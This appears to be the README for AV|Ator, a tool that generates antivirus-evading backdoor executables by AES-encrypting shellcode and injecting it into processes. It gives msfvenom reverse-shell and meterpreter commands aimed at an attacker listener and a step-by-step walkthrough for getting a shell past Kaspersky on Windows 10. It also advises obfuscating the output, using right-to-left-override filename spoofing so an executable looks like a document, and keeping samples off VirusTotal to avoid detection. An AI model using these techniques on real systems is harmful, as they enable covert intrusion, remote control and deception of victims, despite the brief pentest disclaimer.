
### Update 09/12/2021
AV/Ator is discontinued and currently maintained for the sake posterity and research. 

### Update 17/10/2019
It has been reported that the produced backdoor is no more undetectable from the majority of the AV solutions, which is indeed true and which is something I expected by the time that the software is getting more and more 'popular'. As a temporary solution I advise you to use a C# obfuscator on the produced executable. In my case, I used babel for net (http://www.babelfor.net/) with a great success for the majority of AV’s (including Kaspersky, Avast etc.). 


### DO NOT UPLOAD ANY SAMPLES TO VIRUS TOTAL ...as I did it one time for you

# AV|Ator 

**About**://name

***AV**: AntiVirus*

***Ator**: Is a swordsman, alchemist, scientist, magician, scholar, and engineer, with the ability to sometimes produce objects out of thin air* (https://en.wikipedia.org/wiki/Ator)

#

**About**://purpose

**AV|Ator** is a backdoor generator utility, which uses cryptographic and injection techniques in order to bypass AV detection. More specifically:
- It uses AES encryption in order to encrypt a given shellcode 
- Generates an executable file which contains the encrypted payload
- The shellcode is decrypted and injected to the target system using various injection techniques 

[https://attack.mitre.org/techniques/T1055/]:

1. Portable executable injection which involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. 

2. Thread execution hijacking which involves injecting malicious code or the path to a DLL into a thread of a process. Similar to Process Hollowing, the thread must first be suspended.

### Usage

The application has a form which consists of three main inputs (See screenshot bellow):

![Screenshot 2019-04-29 at 11 41 21](https://user-images.githubusercontent.com/4659186/56884876-bca19480-6a73-11e9-8bbf-d249c4813e4e.png)


1.	A text containing the encryption key used to encrypt the shellcode 
2.	A text containing the IV used for AES encryption 
3.	A text containing the shellcode 

Important note: The shellcode should be provided as a C# byte array. 

The default values contain shellcode that executes notepad.exe (32bit). This demo is provided as an indication of how the code should be formed (using msfvenom, this can be easily done with the -f csharp switch, e.g. msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X  LPORT=XXXX -f csharp). 

After filling the provided inputs and selecting the output path an executable is generated according to the chosen options. 

### RTLO option

In simple words, spoof an executable file to look like having an "innocent" extention like 'pdf', 'txt' etc. 
E.g. the file "testcod.exe" will be interpreted as "tesexe.doc" 

Beware of the fact that some AVs alert the spoof by its own as a malware. 

### Set custom icon

I guess you all know what it is :)

### Bypassing Kaspersky AV on a Win 10 x64 host (TEST CASE) 

Getting a shell in a windows 10 machine running fully updated kaspersky AV 

#### Target Machine: Windows 10 x64 

1. Create the payload using msfvenom 

   ```msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=S3cr3TP4ssw0rd -f csharp```

2. Use AVIator with the following settings

    Target OS architecture: x64

    Injection Technique: Thread Hijacking (Shellcode Arch: x64, OS arch: x64) 

    Target procedure: explorer (leave the default)

3. Set the listener on the attacker machine

4. Run the generated exe on the victim machine



### Installation

**Windows:**

Either compile the project or download the allready compiled executable from the following folder:

https://github.com/Ch0pin/AVIator/tree/master/Compiled%20Binaries

**Linux:**

Install Mono according to your linux distribution, download and run the binaries

e.g. in kali:

```
   root@kali# apt install mono-devel 
   
   root@kali# mono aviator.exe
```

### Credits
To Damon Mohammadbagher for the encryption procedure

### Disclaimer 

I developed this app in order to overcome the demanding challenges of the pentest procedure and this is the only way that the app should be used. Make sure that you have the required permission to use it against a system and never use it for illegal purposes. 
I would suggest to avoid testing the executables on solutions like virus total e.t.c. If you want to use the application for pentesting purposes I am sure you have already identified the AV used by your target, so go download a demo and make your testing offline. 


